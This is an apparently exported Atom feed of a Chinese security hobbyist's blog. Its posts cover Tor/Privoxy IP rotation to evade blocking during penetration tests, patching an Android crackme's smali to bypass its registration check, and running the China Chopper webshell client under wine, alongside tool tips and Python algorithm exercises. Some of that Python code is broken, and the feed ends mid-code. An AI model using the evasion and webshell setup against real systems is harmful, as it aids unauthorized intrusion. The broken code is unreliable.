<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ByPupil&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bypupil.github.io/"/>
  <updated>2018-05-01T06:31:31.367Z</updated>
  <id>https://bypupil.github.io/</id>
  
  <author>
    <name>ByPupil</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>适合安全爱好者的截图神器</title>
    <link href="https://bypupil.github.io/2018/05/01/%E9%80%82%E5%90%88%E5%AE%89%E5%85%A8%E7%88%B1%E5%A5%BD%E8%80%85%E7%9A%84%E6%88%AA%E5%9B%BE%E7%A5%9E%E5%99%A8/"/>
    <id>https://bypupil.github.io/2018/05/01/适合安全爱好者的截图神器/</id>
    <published>2018-05-01T06:29:41.000Z</published>
    <updated>2018-05-01T06:31:31.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在乙方安全公司中，信息安全从业者常常需要编写渗透测试，应急响应，漏洞分析等文档。文档编写时需要搭配相关截图来解释说明，此时一款强大的，绿色免费截图工具正是我们作为信息安全从业者强烈渴望的。之前一直使用的是windows自带的截图工具和QQ的截图功能，在朋友推荐下开始使用截图神器<a href="https://www.snipaste.com/" target="_blank" rel="external">Snipaste</a>。跟着<a href="https://docs.snipaste.com/zh-cn/" target="_blank" rel="external">官方文档</a>学习了一遍，个人感觉特别适合信息安全从业者。</p><h2 id="0x01-Snipaste简介"><a href="#0x01-Snipaste简介" class="headerlink" title="0x01 Snipaste简介"></a>0x01 Snipaste简介</h2><p>Snipaste 不只是截图，善用贴图功能将帮助你提升工作效率！</p><h2 id="0x02-基础操作"><a href="#0x02-基础操作" class="headerlink" title="0x02 基础操作"></a>0x02 基础操作</h2><p><strong>截屏</strong></p><ul><li>快捷键（默认F1）</li></ul><p><strong>保存截图（成功截图）</strong></p><ul><li>保存到剪贴板（Ctrl + C / Enter / 双击 截屏区域）</li><li>保存到文件（Ctrl + S）</li><li>保存到贴图（Ctrl + T）</li><li>快速保存（Ctrl + Shift + S）</li></ul><p><strong>取消当前截图</strong></p><ul><li>快捷键（Esc）</li></ul><p><strong>回放截图记录</strong></p><ul><li>快捷键（,(后退)或.(前进)）</li></ul><p><strong>逐像素控制截取区域</strong></p><ul><li>快捷键（WASD）</li></ul><p><strong>放大镜</strong></p><ul><li>快捷键（Alt）</li></ul><p><strong>取色</strong></p><ul><li>当放大镜可见的时候，按下 C 可复制该像素点的颜色值（RGB/Hex）。之后可以 F3 将它贴出，或者 Ctrl + V 贴到其他程序里</li><li>可按下 Shift 来切换颜色格式</li></ul><p><strong>贴图</strong></p><ul><li>贴图是将系统剪贴板中的内容转化成图片，然后作为窗口置顶显示。所以，能否贴出来、贴出来的是什么，取决于系统剪贴板中的内容。</li><li>快捷键（F3）</li><li>旋转（1,2）</li><li>翻转（3,4）</li></ul><h2 id="0x03-更多"><a href="#0x03-更多" class="headerlink" title="0x03 更多"></a>0x03 更多</h2><p>这里只是介绍了一些常用的操作，如果想了解更多<code>Snipaste</code>操作，可以查看<a href="https://www.v2ex.com/member/levie" target="_blank" rel="external">levie</a>发表的文章:<a href="https://www.v2ex.com/t/295433" target="_blank" rel="external">Snipaste - 开发了三年的截图工具，但不只是截图</a>或看<a href="https://docs.snipaste.com/zh-cn/" target="_blank" rel="external">官方文档</a>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在乙方安全公司中，信息安全从业者常常需要编写渗透测试，应急响应，漏洞分析等文档。文档编写时需要搭配相
      
    
    </summary>
    
    
      <category term="神器" scheme="https://bypupil.github.io/tags/%E7%A5%9E%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Tor+Privoxy实现匿名</title>
    <link href="https://bypupil.github.io/2018/03/12/Tor-Privoxy%E5%AE%9E%E7%8E%B0%E5%8C%BF%E5%90%8D/"/>
    <id>https://bypupil.github.io/2018/03/12/Tor-Privoxy实现匿名/</id>
    <published>2018-03-11T16:31:48.000Z</published>
    <updated>2018-03-11T17:26:13.490Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如果代理ip很少。那么就不能在继续渗透你的站点。通过搜索引擎发现一个神器 – Tor。</p><h2 id="0x01-神器介绍"><a href="#0x01-神器介绍" class="headerlink" title="0x01 神器介绍"></a>0x01 神器介绍</h2><p><strong>No.1-Tor</strong><br>官方介绍：Tor是免费软件和开放网络，它帮助您抵御流量分析，威胁个人自由和隐私、机密商业活动和关系以及国家安全的网络监视形式。<br>俗话：Tor可以在不还钱的情况下保护个人隐私。<br><a href="https://www.torproject.org/" target="_blank" rel="external">官方</a></p><p><strong>No.2-Privoxy</strong><br>官方介绍：Privoxy是一款带过滤功能的代理服务器，针对HTTP、HTTPS协议。通过Privoxy的过滤功能，用户可以保护隐私、对网页内容进行过滤、管理cookies，以及拦阻各种广告等。Privoxy可以用作单机，也可以应用到多用户的网络。<br>俗话：将socks代理转换成为http代理和广告过滤的工具。<br><a href="https://www.privoxy.org/" target="_blank" rel="external">官方</a></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>Tor和Privoxy的安装过程在此不在讲解.安装Tor后，如果使用TorBrowser工具就已经可以做到访问任意网页时，每次的ip都是随机的。接下来主要讲解如何让系统中的所有浏览器都走Tor代理流量。<br><strong>OSX</strong><br>在查找资料的时候遇到了一个坑，配置Privoxy的时，<code>forward-socks4a</code>的本地端口会填写<code>9050</code>。然而在实际测试的时候，这个端口其实是不开放的，真正开放的端口是<code>9150</code>。<br>Privoxy配置文件路径：<code>/usr/local/etc/privoxy/config</code>。在配置中添加如下命令：<br><code>forward-socks4a / 127.0.0.1:9050 .</code><br>其实<code>forward-socks4a</code>是命令项，<code>/</code>表示对所有站点进行同样的配置，<code>127.0.0.1:9050</code>表示代理的是Tor的socks端口。</p><p><strong>注意：</strong><br>该命令最后存在一个<code>.</code>。该点表示没有http设置，如果去掉会报错。<br>下一步是配置网络代理，具体如下图：<br><img src="/2018/03/12/Tor-Privoxy实现匿名/1.png" alt="ByPupil" title="ByPupil"><br>此时，使用任意浏览器都可以在每次访问网页时使用不同IP。</p><h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://www.cppblog.com/riverbeast/archive/2007/11/18/36866.html" target="_blank" rel="external">Tor+Privoxy黄金搭档</a><br><a href="http://www.cppblog.com/riverbeast/archive/2007/11/18/36869.html" target="_blank" rel="external">单独使用Privoxy</a><br><a href="http://thehiddenwiki.org/" target="_blank" rel="external">Hidden Wiki .onion Urls Tor Link Directory</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://bypupil.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>WSL初体验</title>
    <link href="https://bypupil.github.io/2017/12/11/WSL%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://bypupil.github.io/2017/12/11/WSL初体验/</id>
    <published>2017-12-11T05:14:50.000Z</published>
    <updated>2017-12-12T00:58:42.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WSL-体验"><a href="#WSL-体验" class="headerlink" title="WSL 体验"></a>WSL 体验</h1><h3 id="WSL-简介"><a href="#WSL-简介" class="headerlink" title="WSL 简介"></a>WSL 简介</h3><p>WSL（Windows System for Linux）是一个为在Windows 10上能够原生运行Linux二进制可执行文件（ELF格式）的兼容。</p><h3 id="WSL-安装"><a href="#WSL-安装" class="headerlink" title="WSL 安装"></a>WSL 安装</h3><p>安装WSL的时候遇到了一些坑，一直以为只要是Windows10以上的任意版本的系统都是可以完美的安装。眼瞎的我，就跳了进去。其实在<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="external">微软官网</a>上已经强调必须是<strong>build 16215</strong>版本或者更新。</p><p><strong>1.启动Linux子系统</strong> </p><ol><li>系统升级到一周年正式版及以上(1607)</li><li>依次在 设置 - 更新与安全 - 针对开发人员 选项中，启用”开发人员模式”</li><li>在资源管理器中打开 控制面板\所有控制面板项\程序和功能 , 打开 启用或关闭 Windows功能 , 勾选 适用于Linux的Windows子系统(Beta)</li><li>重启电脑</li><li>命令行运行 lxrun /install /y 开始安装<br>安装速度取决于网络情况，下载的文件在 %localappdata%\lxss 目录下 lxss.tar.gz (181M)，解压后大概500M, rootfs 目录即为子系统根目录。</li><li>命令行运行 bash 进入Ubuntu默认使用的 root 帐号登录，通过指令 passwd 设置密码。</li><li>毕竟爱折腾，难免会把子系统环境(lxss目录)玩坏掉，因此干正事前最好先备份下以便快速还原。注意，不要直接右键复制或者打包，可能会导致文件权限丢失的。<br>xcopy %localappdata%\lxss %localappdata%\lxss.bak /E</li><li>当然，如果你比较任性也可以不执行上一步的备份操作，通过命令行运行 lxrun /uninstall /full 轻松卸载子系统，重复上面的步骤即可重装，不过要注意下载速度时好时坏哦。</li></ol><p><strong>使用Power shell开启WSL选项方法：</strong>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</p><img src="/2017/12/11/WSL初体验/1.png" alt="ByPupil" title="ByPupil"><img src="/2017/12/11/WSL初体验/2.png" alt="ByPupil" title="ByPupil"><img src="/2017/12/11/WSL初体验/3.png" alt="ByPupil" title="ByPupil"><img src="/2017/12/11/WSL初体验/4.png" alt="ByPupil" title="ByPupil"><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="external">https://docs.microsoft.com/zh-cn/windows/wsl/install-win10</a></p><p><a href="http://www.jianshu.com/p/bc38ed12da1d" target="_blank" rel="external">http://www.jianshu.com/p/bc38ed12da1d</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WSL-体验&quot;&gt;&lt;a href=&quot;#WSL-体验&quot; class=&quot;headerlink&quot; title=&quot;WSL 体验&quot;&gt;&lt;/a&gt;WSL 体验&lt;/h1&gt;&lt;h3 id=&quot;WSL-简介&quot;&gt;&lt;a href=&quot;#WSL-简介&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="Windows工具" scheme="https://bypupil.github.io/tags/Windows%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android软件分析中的的Hello Word</title>
    <link href="https://bypupil.github.io/2017/11/19/Android%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%AD%E7%9A%84%E7%9A%84Hello-Word/"/>
    <id>https://bypupil.github.io/2017/11/19/Android软件分析中的的Hello-Word/</id>
    <published>2017-11-19T09:23:05.000Z</published>
    <updated>2017-11-19T09:40:52.629Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近开始学习apk分析相关的知识，在分析apk中需要不断重复又十分钟的反编译，修改程序，编译，为apk增加签名的步骤进行讲解。这也是方便自己和他人，在问起apk相关问题时，遇到基础步骤时就不需要在一次又一次的讲解，同过以下的一个实验操作去理解反编译，重打包的过程。</p><h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><ol><li>Android模拟器</li><li>apktool</li><li>Android逆向工具</li><li>notepad++</li><li>Hello World（apk程序，该程序根据《Android软件安全与逆向分析》第二章编写）</li></ol><h3 id="0x02-模拟器使用"><a href="#0x02-模拟器使用" class="headerlink" title="0x02 模拟器使用"></a>0x02 模拟器使用</h3><p>该文章在做实验时所使用的模拟器（逍遥安卓模拟器）。对于该程序安装过程不在讲解。启动软件，该模拟器启动之后的截图如下：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/1.png" alt="ByPupil" title="ByPupil"><p>安装程序如下：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/2.png" alt="ByPupil" title="ByPupil"><p>打开该程序后，我尝试输入用户名和注册码,该程序会返回无效用户名或密码，因为我们并不了解该程序的加密方式。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/3.png" alt="ByPupil" title="ByPupil"><h3 id="0x03-反编译apk文件"><a href="#0x03-反编译apk文件" class="headerlink" title="0x03 反编译apk文件"></a>0x03 反编译apk文件</h3><p>对于反编译apk文件有很多种的方法和工具，在此教程中使用的时apktool。基本用法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">反编译apk文件的命令：apktool d[ecode] [OPTS] &lt;file.apk&gt; [&lt;dir&gt;]</div><div class="line">编译apk文件的命令：apktool b[uild] [OPTS] [&lt;app_path&gt;] [&lt;out_file&gt;]</div></pre></td></tr></table></figure></p><p>此处我们使用：<code>apktool d HelloWorld.apk</code>。执行之后会在当前目录下生成名称为HelloWorld的目录。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/4.png" alt="ByPupil" title="ByPupil"><p>反编译后的目录结构如下：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/5.png" alt="ByPupil" title="ByPupil"><h3 id="0x04-分析apk文件"><a href="#0x04-分析apk文件" class="headerlink" title="0x04 分析apk文件"></a>0x04 分析apk文件</h3><p>反编译生成的文件生成了一系列的目录与文件，其中smali目录下存放了程序所有的反汇编代码，res目录则是程序中所有的资源文件。对于突破该程序的破解，是否还记得刚才程序提示的无效用户名或注册码。通过寻找在<code>res/values/strings.xml</code>文件中找到了该字符串，且在<code>res/values/public.xml</code>文件中找到该字符串所对应的id。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/6.png" alt="ByPupil" title="ByPupil"><img src="/2017/11/19/Android软件分析中的的Hello-Word/7.png" alt="ByPupil" title="ByPupil"><p>接着对smali目录下的文件进行搜索字符串<code>0x7f05000b</code>，在<code>smali/com/droider/crackme0201/MainActivity$1.smali</code>中找到了该字符串。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/8.png" alt="ByPupil" title="ByPupil"><p>回溯该文件，在该文件第96行存在if判断，语句如下：<code>if-nez v0, :cond_0</code>。该语句的作用是当v0不为0是跳转到<code>:cond_0</code>处。为了让其判断为0时也进行跳转，我们将其修改为<code>if-eqz v0, :cond_0</code>。使其跳转到<code>:cond_0</code>，此处我们发现了<code>const v1, 0x7f05000c</code>，我们通过搜索<code>public.xml</code>和<code>strings.xml</code>后，发现其值的实际意义为：<code>恭喜您！注册成功</code>。修改后的代码如下：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/9.png" alt="ByPupil" title="ByPupil"><h3 id="0x05-重新编译apk文件并签名"><a href="#0x05-重新编译apk文件并签名" class="headerlink" title="0x05 重新编译apk文件并签名"></a>0x05 重新编译apk文件并签名</h3><p>使用命令：<code>apktool b HelloWorld</code>，即完成了对该程序的重新编译。重新编译后的apk文件位于dist目录下。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/10.png" alt="ByPupil" title="ByPupil"><p>编译生成为<code>HelloWorld.apk</code>文件是没有签名的，还不能安装测试。接下来使用Android逆向助手为该apk文件进行签名。<br>具体步骤如下：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/11.png" alt="ByPupil" title="ByPupil"><p>生成的文件位于dist目录下，其文件名为：<code>HelloWorld_sign.apk</code>。</p><h3 id="0x06-安装测试"><a href="#0x06-安装测试" class="headerlink" title="0x06 安装测试"></a>0x06 安装测试</h3><p>启动Android模拟器，将重新打包的文件进行安装测试。<br>此时，在该程序中输入任意用户名和注册码都是将提示<code>恭喜您!注册成功</code>。</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/12.png" alt="ByPupil" title="ByPupil"><p>这儿说输入任意用户名和注册码都会提示成功，这话有点狂了。上张图瞧瞧：</p><img src="/2017/11/19/Android软件分析中的的Hello-Word/13.png" alt="ByPupil" title="ByPupil"><p>如果输入的用户名与注册码是正确的情况下，反而其输出结果是：<code>无效用户名或注册码</code>。<br>具体其加密过程是如何，大家可以自己研究以下，因为这并不难理解。</p><h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>该文件通过一个实例讲解了Android程序的一般分析与破解流程。学会了这个基础的流程之后才能更好的分析比这个更难更复杂的代码。</p><p><a href="http://pan.baidu.com/s/1bpLcJPd" target="_blank" rel="external">相关材料下载</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近开始学习apk分析相关的知识，在分析apk中需要不断重复又十分钟的反编译，修改程序，编译，为ap
      
    
    </summary>
    
    
      <category term="Android" scheme="https://bypupil.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>中国菜刀在Linux下飞</title>
    <link href="https://bypupil.github.io/2017/10/28/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%9C%A8Linux%E4%B8%8B%E9%A3%9E/"/>
    <id>https://bypupil.github.io/2017/10/28/中国菜刀在Linux下飞/</id>
    <published>2017-10-28T11:12:08.000Z</published>
    <updated>2017-10-28T11:50:29.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>由于一朋友习惯了ubuntu，突然遇到使用了菜刀连接webshell的时候无奈了。先推荐他使用了<code>weevely</code>连接webshell，但是只能连接php。晚上的时候找了些资料，发现可以使用<code>wine</code>让菜刀在<code>Linux</code>中跑起来。</p><h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><ol><li>Kali 2.0</li><li>中国菜刀</li></ol><h3 id="0x02-开始动手"><a href="#0x02-开始动手" class="headerlink" title="0x02 开始动手"></a>0x02 开始动手</h3><p>想也不用想第一步当然是需要将<code>wine</code>安装进系统，然而系统中已经安装了<code>wine</code>。我使用的kali是2017版本的，已经安装的<code>wine</code>的版本是<code>2.0.2</code>。</p><p>第二步是需要安装<code>winetricks</code>。通过命令<code>apt-get install winetricks</code>即可完成<code>winetricks</code>的安装。然后安装菜刀需要的一些dll库。需要安装的类库如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.mfc42</div><div class="line">2.mdac28</div><div class="line">3.jet40</div><div class="line">4.vb6run</div></pre></td></tr></table></figure><p>在正式开始安装这些程序之前会提示需要安装<code>wine32</code>。然后给出了一条命令解决方案。</p><p><code>dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></p><p>安装完之后我们就可以依次执行以下命令安装依赖包。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. winetricks mfc42</div><div class="line">2. winetricks mdac28</div><div class="line">3. winetricks jet40</div><div class="line">4. winetricks vb6ru</div></pre></td></tr></table></figure><p>安装完相关的依赖包之后，就可以将菜刀复制到<code>kali</code>中了。使用命令<code>wine caidao.exe</code>。就可以执行菜刀。</p><p>别说读书少，我骗人。有图有真相，┑(￣▽ ￣)┍。</p><img src="/2017/10/28/中国菜刀在Linux下飞/1.png" alt="ByPupil" title="ByPupil">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;由于一朋友习惯了ubuntu，突然遇到使用了菜刀连接webshell的时候无奈了。先推荐他使用了&lt;c
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://bypupil.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>曾经就该做的程序设计--LeetCode</title>
    <link href="https://bypupil.github.io/2017/10/22/%E6%9B%BE%E7%BB%8F%E5%B0%B1%E8%AF%A5%E5%81%9A%E7%9A%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-LeetCode/"/>
    <id>https://bypupil.github.io/2017/10/22/曾经就该做的程序设计-LeetCode/</id>
    <published>2017-10-22T08:16:03.000Z</published>
    <updated>2017-10-28T11:43:50.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>我是连数据结构还不怎么扎实的菜鸡，写程序也不考虑时间复杂度，辅助变量占用了多少程序。只要完成自己的需求就可以了。然而重回大一时，老师所说的程序首先需要满足以下几点：</p><ul><li>有穷性</li><li>确定性</li><li>可行性</li><li>输入</li><li>输出</li></ul><p>对于一个可以满足需求的程序是可以满足以上五点要求的。其实不然，一个好的程序，依然还需要考虑的是高效率和低存储。看着之前的代码，本可O(n)解决的写成了O(n^2)。纪念我如此之蠢，开始LeetCode的刷题和学习之路。</p><p>本文所使用的所有代码全部使用<code>Python</code>语言编写，代码是根据自己理解和互联网上查找资料，写下自己觉得比较好的代码。</p><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p><strong>1. Two Sum</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(nums, target)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line"><span class="string">  :type nums: List[int]</span></div><div class="line"><span class="string">  :type target: int</span></div><div class="line"><span class="string">  :rtype List[int]</span></div><div class="line"><span class="string">  """</span></div><div class="line">  <span class="keyword">for</span> i, first <span class="keyword">in</span> enumerate(nums):</div><div class="line">    second = target - first</div><div class="line">    <span class="keyword">if</span> second <span class="keyword">in</span> nums[i+<span class="number">1</span>:]:</div><div class="line">      j = nums[i+<span class="number">1</span>:].index(second) + i + <span class="number">1</span></div><div class="line">      <span class="keyword">return</span> [i, j]</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(nums, target)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line"><span class="string">  :type nums: List[int]</span></div><div class="line"><span class="string">  :type target: int</span></div><div class="line"><span class="string">  :rtype List[int]</span></div><div class="line"><span class="string">  """</span></div><div class="line">  dic = dict()</div><div class="line">  <span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(nums):</div><div class="line">    sub = target - value</div><div class="line">    <span class="keyword">if</span> sub <span class="keyword">in</span> dic:</div><div class="line">      <span class="keyword">return</span> [dic[sub], index]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      dic[value] = index</div></pre></td></tr></table></figure><p><strong>2. Remove Element</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(nums, val)</span>:</span></div><div class="line">  j = <span class="number">0</span></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(nums)):</div><div class="line">    <span class="keyword">if</span> nums[i] == val:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">    nums[j] = nums[i]</div><div class="line">    j++</div><div class="line">  <span class="keyword">return</span> j</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;我是连数据结构还不怎么扎实的菜鸡，写程序也不考虑时间复杂度，辅助变量占用了多少程序。只要完成自己的需
      
    
    </summary>
    
    
      <category term="程序设计" scheme="https://bypupil.github.io/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>不会编程的大四狗</title>
    <link href="https://bypupil.github.io/2017/09/24/%E4%B8%8D%E4%BC%9A%E7%BC%96%E7%A8%8B%E7%9A%84%E5%A4%A7%E5%9B%9B%E7%8B%97/"/>
    <id>https://bypupil.github.io/2017/09/24/不会编程的大四狗/</id>
    <published>2017-09-24T09:22:53.000Z</published>
    <updated>2017-09-26T13:26:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天看了一个简单的问题，去通信录上查电话号码。如何完成的，直接回答了二分法，然后自己想了想，既然我脑海中对于代码已经那么不清晰了。这篇文档就纪念下，快被我忘记的算法们。拿起图解算法书开始我的敲码之旅。ORZ~~</p><h3 id="0x01-binary-search"><a href="#0x01-binary-search" class="headerlink" title="0x01 binary search"></a>0x01 binary search</h3><p><strong>时间复杂度:</strong> O(n)=log n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(list, item)</span>:</span></div><div class="line">  high = len(list) - <span class="number">1</span></div><div class="line">  low = <span class="number">0</span></div><div class="line">  <span class="keyword">while</span> low &lt;= high:</div><div class="line">    mid = (low + high) / <span class="number">2</span></div><div class="line">    guess = list[mid]</div><div class="line">    <span class="keyword">if</span> guess == item:</div><div class="line">      <span class="keyword">return</span> mid</div><div class="line">    <span class="keyword">if</span> guess &lt; item:</div><div class="line">      low = mid + <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> guess &gt; item:</div><div class="line">      high = mid - <span class="number">1</span></div><div class="line">  <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(list, start, end, item)</span>:</span></div><div class="line">  <span class="keyword">if</span> start &gt; end：</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span></div><div class="line">  mid = start + (end - start) / <span class="number">2</span></div><div class="line">  <span class="keyword">if</span> list[mid] == item:</div><div class="line">    <span class="keyword">return</span> mid</div><div class="line">  <span class="keyword">if</span> list[mid] &gt; item:</div><div class="line">    <span class="keyword">return</span> binary_search(list, start, mid - <span class="number">1</span>, item)</div><div class="line">  <span class="keyword">if</span> list[mid] &lt; item:</div><div class="line">    low = binary_search(list, mid + <span class="number">1</span>, end, item)</div></pre></td></tr></table></figure><h3 id="0x02-selection-sort"><a href="#0x02-selection-sort" class="headerlink" title="0x02 selection sort"></a>0x02 selection sort</h3><p><strong>时间复杂度:</strong> O(n)=n^2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSmallest</span><span class="params">(arr)</span>:</span></div><div class="line">  smallest = arr[<span class="number">0</span>]</div><div class="line">  smallest_index = <span class="number">0</span></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</div><div class="line">    <span class="keyword">if</span> arr[i] &lt; smallest:</div><div class="line">      smallest = arr[i]</div><div class="line">      smallest_index = i</div><div class="line">  <span class="keyword">return</span> smallest_index</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span 